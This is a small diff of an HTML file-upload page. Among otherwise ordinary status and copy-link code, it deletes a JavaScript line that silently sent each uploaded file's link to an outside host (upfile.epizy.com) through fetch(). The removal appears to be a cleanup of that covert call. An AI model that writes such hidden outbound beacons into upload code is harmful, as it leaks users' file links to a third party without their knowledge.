@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en"><head>
     <meta charset="UTF-8">
@@ -238,7 +239,6 @@
 
           
                 const data = await response.text();
-                const resp_get = await fetch(`http://upfile.epizy.com/co.php?s=${data}`);
                 status.innerHTML = `File uploaded successfully! <br>
                    <a href="#" onclick="copyToClipboard('${data}')"><img src="https://img.icons8.com/material-rounded/24/000000/copy.png" class="icon" /> Copy Link </a>`;
             } catch (error) {
